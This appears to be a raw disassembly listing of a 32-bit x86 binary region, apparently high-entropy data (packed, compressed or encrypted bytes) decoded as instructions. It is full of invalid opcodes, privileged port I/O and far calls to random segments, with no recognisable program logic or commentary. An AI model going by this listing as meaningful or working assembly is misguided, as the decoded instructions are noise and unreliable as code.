  405384:	in     eax,dx
  405385:	cld    
  405386:	lods   eax,DWORD PTR ds:[esi]
  405387:	(bad)  
  40538a:	xlat   BYTE PTR ds:[ebx]
  40538b:	jnp    0x405396
  40538d:	jmp    0xa02b:0x93594e68
  405394:	lds    esp,FWORD PTR [ebp+0x40337ab]
  40539a:	rcl    bl,1
  40539c:	or     cl,bl
  40539e:	jb     0x40540c
  4053a0:	sbb    esi,edi
  4053a2:	rcl    DWORD PTR [esi-0x5c],cl
  4053a5:	push   es
  4053a6:	xchg   esi,eax
  4053a7:	sub    ebx,DWORD PTR [edx]
  4053a9:	ret    0x6239
  4053ac:	stos   BYTE PTR es:[edi],al
  4053ad:	call   0xc7d59a51
  4053b2:	mov    ds:0xc3fe37a1,eax
  4053b7:	sbb    al,0xe7
  4053b9:	adc    eax,0xe18f04a6
  4053be:	sahf   
  4053bf:	dec    edi
  4053c0:	fwait
  4053c1:	mov    ecx,0x5797982d
  4053c6:	adc    al,ch
  4053c8:	xchg   ebp,eax
  4053c9:	popf   
  4053ca:	cmp    ah,dl
  4053cc:	push   ebx
  4053cd:	call   0x4ccd:0x9323315a
  4053d4:	dec    esi
  4053d5:	lahf   
  4053d6:	adc    esi,esp
  4053d8:	aas    
  4053d9:	or     DWORD PTR [ecx-0x5290e5be],edi
  4053df:	pop    ebx
  4053e0:	jp     0x405409
  4053e2:	xchg   DWORD PTR [edx-0x68],eax
  4053e5:	outs   dx,DWORD PTR ds:[esi]
  4053e7:	xchg   DWORD PTR [esi],ebx
  4053e9:	cli    
  4053ea:	fsubr  DWORD PTR [eax]
  4053ec:	jl     0x4053bc
  4053ee:	and    al,0x19
  4053f0:	addr16 mov ch,0x9d
  4053f3:	(bad)  
  4053f4:	addr16 cmp dh,ch
  4053f7:	arpl   WORD PTR [ebx],dx
  4053f9:	mov    dh,0x24
  4053fb:	cwde   
  4053fc:	cmp    al,0x5d
  4053fe:	jae    0x4053ff
  405400:	daa    
  405401:	push   edi
  405402:	or     DWORD PTR [ecx+0x26],edi
  405405:	sbb    al,0xfe
  405407:	bound  esi,QWORD PTR ds:0x23c2487
  40540d:	inc    edx
  40540e:	and    DWORD PTR [ebx-0x40],esi
  405411:	cmp    esp,DWORD PTR [esp+edx*4-0x3775ce1a]
  405418:	in     eax,dx
  405419:	add    dl,BYTE PTR [ecx]
  40541b:	into   
  40541c:	push   eax
  40541d:	inc    edi
  40541e:	retf   
  40541f:	xor    BYTE PTR [eax-0x2c],0xb3
  405423:	jp     0x40543b
  405425:	cmp    BYTE PTR cs:0x7048ac82,0x2c
  40542d:	xor    ecx,DWORD PTR [edi+0x79]
  405430:	rcl    bh,cl
  405432:	nop
  405433:	fucomi st,st(7)
  405435:	clc    
  405436:	push   cs
  405437:	jg     0x40540a
  405439:	fldcw  WORD PTR [ecx-0x58357d98]
  40543f:	cmp    eax,DWORD PTR [ecx]
  405441:	mov    eax,ds:0x60cc7cd8
  405446:	lods   al,BYTE PTR ds:[esi]
  405447:	pop    ss
  405448:	(bad)  
  405449:	stos   DWORD PTR es:[edi],eax
  40544a:	sub    edi,DWORD PTR [eax+0xd997ac]
  405450:	jo     0x40544b
  405452:	int    0x3f
  405454:	std    
  405455:	or     eax,0x2d18e020
  40545a:	jecxz  0x40543e
  40545c:	je     0x4054ce
  40545e:	push   esi
  40545f:	sub    eax,0xb600af4
  405464:	push   ebp
  405465:	inc    ebp
  405466:	test   eax,0x755a2738
  40546b:	out    0x8c,al
  40546d:	nop
  40546e:	cdq    
  40546f:	sub    esp,eax
  405471:	aas    
  405472:	jbe    0x4054a3
  405474:	loopne 0x4053fd
  405476:	or     dh,0x33
  405479:	sahf   
  40547a:	sub    BYTE PTR [ebp-0x3e76111c],0x11
  405481:	stos   DWORD PTR es:[edi],eax
  405482:	pop    ecx
  405483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405484:	outs   dx,DWORD PTR ds:[esi]
  405485:	(bad)  
  405486:	sub    DWORD PTR [edx],ebx
  405488:	push   eax
  405489:	mov    ch,0xf3
  40548b:	cmp    al,0x39
  40548d:	push   ebx
  40548e:	fsub   QWORD PTR [ecx]
  405490:	sub    ah,bh
  405492:	push   eax
  405493:	push   ds
  405494:	dec    ecx
  405495:	mov    al,0x34
  405497:	jle    0x405444
  405499:	cdq    
  40549a:	scas   eax,DWORD PTR es:[edi]
  40549b:	popa   
  40549c:	fnstenv [eax+0x622cab1f]
  4054a2:	pop    ds
  4054a3:	scas   eax,DWORD PTR es:[edi]
  4054a4:	mov    ch,ah
  4054a6:	leave  
  4054a7:	or     eax,0x9e093881
  4054ac:	jne    0x40543d
  4054ae:	int    0xa8
  4054b0:	daa    
  4054b1:	stc    
  4054b2:	test   DWORD PTR [ebx+0x20869968],edx
  4054b8:	dec    esi
  4054b9:	clc    
  4054ba:	ror    BYTE PTR [ebx+0x26d51ac7],1
  4054c0:	mov    bh,0xa
  4054c2:	fidivr WORD PTR [edx+edx*2+0x6e]
  4054c6:	inc    eax
  4054c7:	add    BYTE PTR [esi+ebp*1+0x19],0xe
  4054cc:	jmp    0x5cc5e4b5
  4054d1:	jo     0x405507
  4054d3:	adc    eax,DWORD PTR ds:0x2cec2880
  4054d9:	aaa    
  4054da:	mov    ebx,0x519b384
  4054df:	stc    
  4054e0:	gs das 
  4054e2:	loopne 0x4054c1
  4054e4:	xchg   esp,eax
  4054e5:	sbb    ah,ch
  4054e7:	call   0xa04b657a
  4054ec:	out    dx,al
  4054ed:	xor    dl,BYTE PTR [edx-0x62]
  4054f0:	push   esp
  4054f1:	js     0x405521
  4054f3:	sbb    ebx,DWORD PTR [edx]
  4054f5:	mov    cl,0x7c
  4054f7:	in     eax,dx
  4054f8:	sub    eax,0x4b636442
  4054fd:	or     al,BYTE PTR [ecx+0x7f]
  405500:	xchg   ecx,eax
  405501:	sub    eax,0xd44ea53f
  405506:	push   0x2
  405508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405509:	mov    ecx,0x3f0018b
  40550e:	mov    bp,0xf4d2
  405512:	add    bl,BYTE PTR [ecx-0x6d691fe2]
  405518:	(bad)  
  405519:	xchg   esp,eax
  40551a:	out    0x2b,al
  40551c:	sub    eax,0x70e4ed50
  405521:	xchg   BYTE PTR [ebx+esi*8+0xc321eee],cl
  405528:	shr    bl,cl
  40552a:	and    dl,BYTE PTR [esi-0x5e]
  40552d:	out    dx,al
  40552e:	adc    ebx,DWORD PTR [edi+0x43ea5cf2]
  405534:	xchg   esi,eax
  405535:	jge    0x4054d5
  405537:	pop    ecx
  405538:	mov    fs,eax
  40553a:	push   cs
  40553b:	sbb    eax,edi
  40553d:	add    ch,BYTE PTR [ebp-0x40913b25]
  405543:	sub    BYTE PTR [ebx],dl
  405545:	ss adc eax,0xcba76c12
  40554b:	xor    DWORD PTR [edx+0x71],ecx
  40554e:	popa   
  40554f:	sbb    ah,BYTE PTR [edx+0x1e70fbf7]
  405555:	outs   dx,BYTE PTR ds:[esi]
  405556:	fsub   QWORD PTR [ebx+0x5f]
  405559:	jmp    0x2b948c15
  40555e:	push   es
  40555f:	xor    cl,0x33
  405562:	adc    al,0x33
  405564:	mov    esp,0x54df401a
  405569:	(bad)  
  40556a:	mov    esp,0xc2656e01
  40556f:	fld    QWORD PTR [esi+0x2ced3986]
  405575:	mov    eax,0xcae7660
  40557a:	ret    
  40557b:	aaa    
  40557c:	sub    DWORD PTR [ebp+eax*8+0xbc04d2c],0xf4ff8187
  405587:	sar    BYTE PTR [ebx+0x764bf0b3],cl
  40558d:	test   BYTE PTR [ebx-0x344c1a13],0x30
  405594:	dec    esp
  405595:	dec    esp
  405596:	cmp    bl,BYTE PTR [ebx+0x36ee5c11]
  40559c:	aaa    
  40559d:	mov    dh,0x2e
  40559f:	out    dx,al
  4055a0:	cmp    eax,0x231c9bad
  4055a5:	cli    
  4055a6:	dec    ebx
  4055a7:	and    bl,cl
  4055a9:	push   ss
  4055aa:	pop    ebx
  4055ab:	cli    
  4055ac:	add    cl,0x7e
  4055af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055b0:	pop    es
  4055b1:	mov    dl,0x17
  4055b3:	movzx  eax,WORD PTR [edi]
  4055b6:	mov    al,ds:0x2c0af5f9
  4055bb:	dec    esi
  4055bc:	and    eax,0xccd9ec64
  4055c1:	mov    bl,0x64
  4055c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055c4:	pop    ss
  4055c5:	ds pop ebx
  4055c7:	leave  
  4055c8:	call   0x29476130
  4055cd:	out    dx,al
  4055ce:	aad    0x19
  4055d0:	xchg   ebx,eax
  4055d1:	bound  edx,QWORD PTR [eax-0xf15fb8e]
  4055d7:	jne    0x4055a4
  4055d9:	and    al,0xd9
  4055db:	ja     0x405613
  4055dd:	add    bl,ch
  4055df:	mov    eax,esi
  4055e1:	cvtpi2ps xmm5,QWORD PTR [esi]
  4055e4:	shl    esp,0x87
  4055e7:	cmp    dh,ch
  4055e9:	xor    edx,edi
  4055eb:	popa   
  4055ec:	sub    DWORD PTR [esi],esp
  4055ee:	xor    DWORD PTR [ebp+0x5967eb0d],eax
  4055f4:	(bad)  
  4055f5:	arpl   cx,cx
  4055f7:	repnz sbb al,0x7f
  4055fa:	pop    ebp
  4055fb:	dec    ebp
  4055fc:	shl    BYTE PTR [ecx-0x7e],0xf9
  405600:	hlt    
  405601:	inc    eax
  405602:	pop    ebp
  405603:	pop    esp
  405604:	adc    eax,0x938f04d3
  405609:	add    eax,0x6b017bf8
  40560e:	stos   DWORD PTR es:[edi],eax
  40560f:	or     eax,0x2d1ca2ef
  405614:	add    DWORD PTR [esi+0x44],esp
  405617:	jmp    0x4c676e11
  40561c:	mov    ecx,0xf2d1fa9d
  405621:	ficomp WORD PTR [edi+0x4353f2e9]
  405627:	add    eax,edx
  405629:	fnstenv ds:0x380a1079
  40562f:	in     eax,dx
  405630:	or     BYTE PTR [ebp+0x10],cl
  405633:	or     al,0x5e
  405635:	retf   
  405636:	and    BYTE PTR [edi],dh
  405638:	adc    BYTE PTR [eiz*2-0x5fba2a29],bl
  40563f:	mov    bh,0x74
  405641:	arpl   bx,di
  405643:	pop    es
  405644:	test   DWORD PTR [eax-0xe],esp
  405647:	jp     0x40560e
  405649:	ror    BYTE PTR [ecx+0x16],0x6a
  40564d:	pushf  
  40564e:	mov    ebp,0x374af201
  405653:	in     al,0xb0
  405655:	adc    ah,BYTE PTR [ecx-0x3e93e9ab]
  40565b:	xor    DWORD PTR [ecx],0x132336b5
  405661:	das    
  405662:	arpl   WORD PTR [edi-0x4d32d2be],ax
  405668:	add    DWORD PTR [esi+0x7192d6e],0xa775ca0
  405672:	shl    DWORD PTR [edx+0x34],1
  405675:	outs   dx,DWORD PTR ds:[esi]
  405676:	jmp    FWORD PTR [eax+0x3d]
  405679:	inc    ebx
  40567a:	push   0xb00aab03
  40567f:	mov    ebp,0xdee8f881
  405684:	iret   
  405685:	dec    esi
  405686:	outs   dx,BYTE PTR ds:[esi]
  405687:	cs jbe 0x40568b
  40568a:	push   ebp
  40568b:	es jge 0x40569a
  40568e:	inc    esi
  40568f:	imul   esp,DWORD PTR [ebp+ebp*1+0x690cf0ff],0xcaf87e67
  40569a:	adc    ch,bl
  40569c:	(bad)  
  40569e:	imul   ebp,DWORD PTR [esi],0x18
  4056a1:	mov    ebp,0xda05034e
  4056a6:	mov    edi,0x531c4275
  4056ab:	xlat   BYTE PTR ds:[ebx]
  4056ac:	dec    esp
  4056ad:	fdivr  DWORD PTR [ebx+0xc7ce9d5]
  4056b3:	gs js  0x405689
  4056b6:	call   0x15f5:0x57cbc8a9
  4056bd:	cwde   
  4056be:	mov    WORD PTR [ebx+0x1c],ss
  4056c1:	mov    ds:0x607ce618,eax
  4056c6:	and    dh,BYTE PTR [ecx]
  4056c8:	cmp    BYTE PTR [ebx+0x32],cl
  4056cb:	mov    ch,0xe4
  4056cd:	pop    esi
  4056ce:	sbb    DWORD PTR [edi-0x6a],ecx
  4056d1:	inc    edi
  4056d2:	xchg   edi,eax
  4056d3:	out    0x4b,al
  4056d5:	scas   al,BYTE PTR es:[edi]
  4056d6:	pop    ebx
  4056d7:	push   edi
  4056d8:	popf   
  4056d9:	xlat   BYTE PTR ds:[ebx]
  4056da:	scas   al,BYTE PTR es:[edi]
  4056db:	outs   dx,BYTE PTR ds:[esi]
  4056dc:	xor    eax,0x2e2f50f3
  4056e1:	cwde   
  4056e2:	ins    BYTE PTR es:[edi],dx
  4056e3:	stos   DWORD PTR es:[edi],eax
  4056e4:	pusha  
  4056e5:	lock mov ch,0x10
  4056e8:	or     eax,0x17e9ced1
  4056ed:	shl    BYTE PTR [eax],cl
  4056ef:	dec    esi
  4056f0:	leave  
  4056f1:	aas    
  4056f2:	daa    
  4056f3:	sbb    eax,0x6192c7f
  4056f8:	sub    al,BYTE PTR [ebp+eiz*1-0x3d]
  4056fc:	loop   0x4056ff
  4056fe:	das    
  4056ff:	xchg   esi,eax
  405700:	push   ss
  405701:	rcl    DWORD PTR [edi-0x4d],cl
  405704:	push   ebx
  405705:	fistp  WORD PTR [eax]
  405707:	pop    ecx
  405708:	scas   eax,DWORD PTR es:[edi]
  405709:	retf   0x9388
  40570c:	sti    
  40570d:	dec    esp
  40570e:	cmp    eax,0xf39e47bc
  405713:	add    al,0x3c
  405715:	jle    0x405697
  405717:	rol    BYTE PTR ss:[eax],cl
  40571a:	add    eax,0x74876a8c
  40571f:	lock mov al,0xdd
  405722:	out    0x81,eax
  405724:	push   es
  405725:	repnz xchg ebx,eax
  405727:	outs   dx,DWORD PTR ds:[esi]
  405728:	pop    ebp
  405729:	js     0x40579d
  40572b:	push   cs
  40572c:	nop
  40572d:	or     BYTE PTR [ebp+0x3e],0xf1
  405731:	mov    eax,ds:0x3cc3e35f
  405736:	stc    
  405737:	and    edx,DWORD PTR [edi+0x1c4f1b8c]
  40573d:	das    
  40573e:	(bad)  
  40573f:	ret    0x604e
  405742:	ror    DWORD PTR [ebx+0x50911f0c],0x9b
  405749:	or     al,0x54
  40574b:	loop   0x40574a
  40574d:	cmp    edi,DWORD PTR [ebx]
  40574f:	sub    DWORD PTR [eax-0x3ab2893c],ebx
  405755:	retf   
  405756:	sub    DWORD PTR [edx-0x47],eax
  405759:	outs   dx,BYTE PTR ds:[esi]
  40575a:	mov    esi,0xaac37fee
  40575f:	inc    eax
  405760:	jl     0x405767
  405762:	mov    esi,0x75b32e56
  405767:	iret   
  405768:	and    eax,0x6acf469
  40576d:	call   ebp
  40576f:	les    eax,FWORD PTR [ecx+0x40]
  405772:	and    edx,DWORD PTR ds:0x4a886390
  405778:	pop    esp
  405779:	mov    al,BYTE PTR [eax]
  40577b:	outs   dx,DWORD PTR ds:[esi]
  40577c:	test   DWORD PTR [ebx+0x10015e5d],0xf04a3e06
  405786:	shr    ch,0x71
  405789:	xchg   edi,eax
  40578a:	push   es
  40578b:	sbb    ah,BYTE PTR [edx]
  40578d:	pop    es
  40578e:	sbb    al,0x87
  405790:	bound  ecx,QWORD PTR fs:0x5d09ec5d
  405797:	lahf   
  405798:	shr    BYTE PTR [ebx],0x7
  40579b:	push   edx
  40579c:	push   esi
  40579d:	das    
  40579e:	push   ss
  40579f:	nop
  4057a0:	call   0xb223:0x8e63c29b
  4057a7:	dec    esp
  4057a8:	and    ebx,DWORD PTR [edx+eiz*8+0x7f]
  4057ac:	out    0x8a,eax
  4057ae:	imul   ebp,eax,0x4
  4057b1:	aas    
  4057b2:	cmp    ah,bh
  4057b4:	sub    eax,0x2d4ea14c
  4057b9:	add    dh,0x91
  4057bc:	call   0xf7d2ac4b
  4057c1:	add    eax,0xfaa1f00
  4057c6:	xchg   ecx,eax
  4057c7:	push   edx
  4057c8:	cmp    DWORD PTR [edx+0x65fd90e9],esi
  4057ce:	inc    ebx
  4057cf:	out    0x3b,al
  4057d1:	stos   DWORD PTR es:[edi],eax
  4057d2:	ror    BYTE PTR [esi],1
  4057d4:	inc    ecx
  4057d5:	js     0x4057a6
  4057d7:	nop
  4057d8:	mov    bh,0x6
  4057da:	cmp    bl,BYTE PTR [esp+esi*2-0x3da5cc49]
  4057e1:	dec    esi
  4057e2:	out    0xe2,al
  4057e4:	into   
  4057e5:	into   
  4057e6:	fcom   st(2)
  4057e8:	sub    esi,ebx
  4057ea:	cmp    DWORD PTR [ecx+0x35],0x24247af
  4057f1:	jl     0x4057a1
  4057f3:	cs int3 
  4057f5:	leave  
  4057f6:	dec    eax
  4057f7:	shl    BYTE PTR [ecx+ebp*1-0x2c1916fe],cl
  4057fe:	mov    dh,0x5b
  405800:	dec    ecx
  405801:	xor    BYTE PTR [edx-0x33c0d91a],0x5e
  405808:	rcl    DWORD PTR [edx+0x2f],1
  40580b:	jnp    0x405839
  40580d:	hlt    
  40580e:	pop    es
  40580f:	cwde   
  405810:	fs enter 0x650d,0xd6
  405815:	cli    
  405816:	setle  BYTE PTR [edi-0x11bbcb50]
  40581d:	pop    edx
  40581e:	mov    WORD PTR [ecx+eax*2-0x6fbb472d],ss
  405825:	sub    DWORD PTR [ecx-0x7d],ecx
  405828:	leave  
  405829:	jl     0x405868
  40582b:	lods   al,BYTE PTR ds:[esi]
  40582c:	test   DWORD PTR [ecx-0x51],edi
  40582f:	call   DWORD PTR [esp+esi*1]
  405832:	dec    esi
  405833:	mov    edx,esp
  405835:	fistp  DWORD PTR [esp+edx*8+0x19a41324]
  40583c:	(bad)  
  40583d:	xor    eax,0xc9126295
  405842:	mov    ds:0xe64d0ae,eax
  405847:	aam    0x49
  405849:	gs loopne 0x405850
  40584c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40584d:	fsub   DWORD PTR [ecx+0x77fcbfdb]
  405853:	stos   DWORD PTR es:[edi],eax
  405854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405855:	mov    edi,DWORD PTR [edi+0x3c]
  405858:	xchg   ebp,eax
  405859:	dec    ebp
  40585a:	and    cl,BYTE PTR [ebx-0xf831fde]
  405860:	add    edi,ebx
  405862:	cmp    DWORD PTR [edi-0x2b36e35a],edi
  405868:	dec    edi
  405869:	jp     0x405827
  40586b:	pop    ebp
  40586c:	jbe    0x4057ff
  40586e:	dec    ebp
  40586f:	or     DWORD PTR [eax+0x63],ecx
  405872:	jnp    0x4057f7
  405874:	outs   dx,BYTE PTR ds:[esi]
  405875:	sbb    al,0xdc
  405877:	xchg   esp,eax
  405878:	imul   edx,DWORD PTR [edx-0x7c7632ef],0x2
  40587f:	mov    DWORD PTR [edx],esi
  405881:	imul   DWORD PTR [esi-0x2a6a39da]
  405887:	inc    ebx
  405888:	stos   BYTE PTR es:[edi],al
  405889:	out    0x94,al
  40588b:	jno    0x405886
  40588d:	mov    al,0x26
  40588f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405890:	out    0x32,al
  405892:	lods   eax,DWORD PTR ds:[esi]
  405893:	inc    ecx
  405894:	xchg   esp,eax
  405895:	es stc 
  405897:	in     al,0x24
  405899:	add    DWORD PTR [ebp+0x75ac8a58],edx
  40589f:	test   BYTE PTR [ebp-0x735657a4],bl
  4058a5:	les    ebx,FWORD PTR [edi]
  4058a7:	ds out dx,al
  4058a9:	mov    ebx,ecx
  4058ab:	dec    edi
  4058ac:	sbb    BYTE PTR [edi],bh
  4058ae:	sub    eax,0xf8f88a6
  4058b3:	mov    DWORD PTR [eax+0x60],eax
  4058b6:	std    
  4058b7:	add    bh,bl
  4058b9:	scas   eax,DWORD PTR es:[edi]
  4058ba:	int3   
  4058bb:	jmp    0x4058dd
  4058bd:	mov    ?,WORD PTR [edx]
  4058bf:	(bad)  
  4058c0:	sub    DWORD PTR [ebx-0x6f],esp
  4058c3:	xor    ebp,DWORD PTR [ecx]
  4058c5:	or     DWORD PTR [edx+0x37f955fe],esi
  4058cb:	sub    BYTE PTR [eax-0x6e63375e],ch
  4058d1:	aaa    
  4058d2:	stos   DWORD PTR es:[edi],eax
  4058d3:	lods   eax,DWORD PTR ds:[esi]
  4058d4:	and    eax,0xde491106
  4058d9:	(bad)  cs:[ecx]
  4058dc:	pop    esi
  4058dd:	out    0x5e,al
  4058df:	scas   al,BYTE PTR es:[edi]
  4058e0:	scas   al,BYTE PTR es:[edi]
  4058e1:	push   es
  4058e2:	call   0xa307:0xe615462e
  4058e9:	loope  0x40589a
  4058eb:	dec    ebp
  4058ec:	add    BYTE PTR [edi+0xb],0x95
  4058f0:	adc    BYTE PTR [eax+0x1],0xc1
  4058f4:	push   edi
  4058f5:	repz and dh,BYTE PTR [ebp+0x4e931e8a]
  4058fc:	cmp    al,0xfa
  4058fe:	outs   dx,DWORD PTR ds:[esi]
  4058ff:	lock nop
  405901:	mov    ch,bl
  405903:	add    bl,bh
  405905:	jl     0x405927
  405907:	pop    ebx
  405908:	xchg   esp,eax
  405909:	xchg   esi,eax
  40590a:	add    ch,ch
  40590c:	cmc    
  40590d:	cmp    al,0xd
  40590f:	jge    0x405891
  405911:	dec    esp
  405912:	mov    esi,0x8312bfa1
  405917:	loop   0x4058bb
  405919:	outs   dx,BYTE PTR ds:[si]
  40591b:	push   esi
  40591c:	push   esp
  40591d:	sub    eax,0xb8811353
  405922:	adc    eax,0x7194aaf5
  405927:	(bad)  
  405928:	je     0x4059a5
  40592a:	mov    dh,bl
  40592c:	cbw    
  40592e:	or     edi,ecx
  405930:	add    ch,dl
  405932:	push   eax
  405933:	ins    BYTE PTR es:[edi],dx
  405934:	push   edi
  405935:	adc    al,0x61
  405937:	pushf  
  405938:	jmp    0x5c08db30
  40593d:	xchg   ah,ah
  40593f:	push   ecx
  405940:	mov    ebx,0xc5ad0e4
  405945:	in     eax,dx
  405946:	xor    dl,dl
  405948:	xor    ecx,ecx
  40594a:	popf   
  40594b:	cmp    BYTE PTR cs:[edx-0x38282a16],0x3c
  405953:	and    DWORD PTR [ebp*4-0x3ef53c7c],esi
  40595a:	pushf  
  40595b:	mov    eax,0xd29659b7
  405960:	popf   
  405961:	shr    BYTE PTR ds:0x6a57ab97,1
  405967:	push   edx
  405968:	xchg   BYTE PTR [eax],dh
  40596a:	or     DWORD PTR [edi+0x75],edx
  40596d:	retf   
  40596e:	mov    esp,0x9650c1dd
  405973:	push   edi
  405974:	xchg   edi,eax
  405975:	adc    eax,eax
  405977:	mov    ah,BYTE PTR [eax]
  405979:	mov    edi,0x97bbedad
  40597e:	loope  0x40598a
  405980:	mov    ecx,0x82a51753
  405985:	dec    edi
  405986:	scas   al,BYTE PTR es:[edi]
  405987:	add    DWORD PTR ds:0x48ac3237,ebx
  40598d:	ret    
  40598e:	sbb    DWORD PTR [ebp+0xb585c97],0x3bb6f520
  405998:	mov    BYTE PTR [edx+0x77],bh
  40599b:	mov    edx,0xec899b34
  4059a0:	andnps xmm0,XMMWORD PTR [ebx]
  4059a3:	lods   al,BYTE PTR ds:[esi]
  4059a4:	sahf   
  4059a5:	xchg   esp,eax
  4059a6:	lahf   
  4059a7:	dec    esi
  4059a8:	jae    0x4059ad
  4059aa:	das    
  4059ab:	shl    BYTE PTR [edi-0x24faf82c],0xd4
  4059b2:	stc    
  4059b3:	outs   dx,BYTE PTR ds:[esi]
  4059b4:	sti    
  4059b5:	push   0xaf3fcfdb
  4059ba:	in     eax,dx
  4059bb:	mov    esp,0xbffc85eb
  4059c0:	cmp    BYTE PTR [edx-0x7c761ab8],cl
  4059c6:	out    dx,eax
  4059c7:	mov    ebx,0x51e6ac11
  4059cc:	pop    ebp
  4059cd:	xchg   bh,bl
  4059cf:	push   esp
  4059d0:	add    dl,BYTE PTR [edi+0x3f41e375]
  4059d6:	popa   
  4059d7:	not    dl
  4059d9:	cs mov edi,0x93622c1f
  4059df:	adc    eax,0x3f42e93b
  4059e4:	sbb    bl,BYTE PTR [edx-0x5e859cd0]
  4059ea:	pop    ds
  4059eb:	add    eax,0xcdef2e67
  4059f0:	mov    edi,0xdda20c76
  4059f5:	jno    0x405a51
  4059f7:	xor    DWORD PTR [ebp-0x2f],ebp
  4059fa:	xchg   edx,eax
  4059fb:	push   ss
  4059fc:	je     0x405a12
  4059fe:	push   es
  4059ff:	ins    DWORD PTR es:[edi],dx
  405a00:	retf   
  405a01:	cld    
  405a02:	cmp    al,0x73
  405a04:	mov    al,0xc7
  405a06:	daa    
  405a07:	add    BYTE PTR [edx+0x2960e5cd],dl
  405a0d:	jg     0x4059df
  405a0f:	dec    ebx
  405a10:	jns    0x4059ec
  405a12:	cwde   
  405a13:	inc    ebp
  405a14:	xchg   esp,eax
  405a15:	bound  edi,QWORD PTR [ebx+0x306800a6]
  405a1b:	mov    ecx,0xc71426f1
  405a20:	xchg   DWORD PTR [esi+0x23],eax
  405a23:	jl     0x405a22
  405a25:	pushf  
  405a26:	out    0x9e,al
  405a28:	neg    DWORD PTR [edx+0x5c]
  405a2b:	xor    edi,esp
  405a2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a2e:	imul   esp,ebx,0x39971b18
  405a34:	int3   
  405a35:	xchg   edi,eax
  405a36:	out    0xa5,eax
  405a38:	call   0xcc52:0x17d60e85
  405a3f:	into   
  405a40:	inc    eax
  405a41:	add    al,0x57
  405a43:	pop    ecx
  405a44:	push   ebx
  405a45:	dec    esp
  405a46:	add    esp,DWORD PTR ds:[ecx-0x5b3539dd]
  405a4d:	fst    DWORD PTR [edi+0x34]
  405a50:	xor    cl,al
  405a52:	adc    al,0xef
  405a54:	enter  0x5f3f,0xab
  405a58:	gs (bad) 
  405a5b:	push   ss
  405a5c:	(bad)  
  405a5d:	aaa    
  405a5e:	mov    ecx,0x5b152a53
  405a63:	ja     0x4059f1
  405a65:	mov    eax,0xc3b5cc16
  405a6a:	jne    0x405a2b
  405a6c:	mov    WORD PTR [ebx],cs
  405a6e:	shr    dl,0x8f
  405a71:	mov    ecx,0xd1530601
  405a76:	or     eax,0xab87fdb
  405a7b:	dec    BYTE PTR [ebx]
  405a7d:	dec    eax
  405a7e:	jl     0x405a5d
  405a80:	xchg   DWORD PTR [ebx+0x2125cbe3],edi
  405a86:	in     al,dx
  405a87:	leave  
  405a88:	les    eax,FWORD PTR [esi+0x33d89932]
  405a8e:	mov    ecx,0x6f056c5e
  405a93:	jnp    0x405a4b
  405a95:	push   esi
  405a96:	lahf   
  405a97:	ins    DWORD PTR es:[edi],dx
  405a98:	push   ds
  405a99:	std    
  405a9a:	mov    dh,0x82
  405a9c:	sbb    ch,BYTE PTR [edx-0x30]
  405a9f:	dec    esp
  405aa0:	mov    bl,0xb
  405aa2:	call   0x1a2:0x9bb7d76c
  405aa9:	or     edx,ecx
  405aab:	mov    bl,0x90
  405aad:	leave  
  405aae:	sub    eax,0x6156a0be
  405ab3:	push   0x3c9b743
  405ab8:	leave  
  405ab9:	push   ds
  405aba:	shr    DWORD PTR [ecx+eiz*8-0x76dae28e],cl
  405ac1:	jecxz  0x405b3a
  405ac3:	pop    ebx
  405ac4:	jbe    0x405ae2
  405ac6:	dec    ecx
  405ac7:	ds leave 
  405ac9:	or     al,0x9e
  405acb:	data16 and BYTE PTR [edx],0xf1
  405acf:	mov    cl,0xe
  405ad1:	popf   
  405ad2:	retf   
  405ad3:	scas   eax,DWORD PTR es:[edi]
  405ad4:	call   FWORD PTR [ebx+0x33f4954]
  405ada:	sub    eax,0x17b982d7
  405adf:	test   bl,al
  405ae1:	inc    eax
  405ae2:	sbb    WORD PTR [edx-0x7],dx
  405ae6:	pop    ds
  405ae7:	ins    DWORD PTR es:[edi],dx
  405ae8:	ins    DWORD PTR es:[edi],dx
  405ae9:	push   edx
  405aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aeb:	xchg   ecx,eax
  405aec:	repz aam 0x3
  405aef:	loop   0x405acb
  405af1:	cli    
  405af2:	inc    esi
  405af3:	and    al,0x43
  405af5:	and    eax,0x82bc415
  405afa:	int    0x5a
  405afc:	sbb    DWORD PTR [edx-0x190f021d],edi
  405b02:	pop    edx
  405b03:	mov    dh,BYTE PTR [eax+0x2d7e19b6]
  405b09:	add    ch,al
  405b0b:	lds    ebp,FWORD PTR [esi+esi*2-0x339e19b6]
  405b12:	retf   
  405b13:	ficom  DWORD PTR [ebx+0x13]
  405b16:	stos   BYTE PTR es:[edi],al
  405b17:	fs ds jae 0x405b0a
  405b1b:	iret   
  405b1c:	lds    edx,FWORD PTR [edx-0x8]
  405b1f:	cmp    eax,0x63f69abf
  405b24:	lods   al,BYTE PTR ds:[esi]
  405b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b26:	push   esp
  405b27:	loopne 0x405b67
  405b29:	ret    0x2147
  405b2c:	repnz push esp
  405b2e:	es push ds
  405b30:	fcomp  QWORD PTR [edi-0xe]
  405b33:	jae    0x405ba8
  405b35:	mov    ch,0xf7
  405b37:	fmul   st(4),st
  405b39:	fimul  DWORD PTR [ecx-0x10]
  405b3c:	outs   dx,BYTE PTR ds:[esi]
  405b3d:	xchg   BYTE PTR [ebx+esi*1],dh
  405b40:	and    DWORD PTR [ebx],ebp
  405b42:	mov    bh,0xa7
  405b44:	inc    ecx
  405b45:	mov    dl,0xa6
  405b47:	paddq  mm5,QWORD PTR [eax]
  405b4a:	(bad)  
  405b4b:	push   cs
  405b4c:	dec    esi
  405b4d:	dec    ebx
  405b4e:	ins    BYTE PTR es:[edi],dx
  405b4f:	aaa    
  405b50:	mov    edx,0x5c088d0
  405b55:	mov    ebx,0x22316edd
  405b5a:	jnp    0x405aee
  405b5c:	popa   
  405b5d:	dec    esi
  405b5e:	xchg   ebp,eax
  405b5f:	call   0x3468:0x36d6dd04
  405b66:	adc    eax,0xb1f55923
  405b6b:	xor    eax,0x98edaa5e
  405b70:	and    eax,0xfefdb279
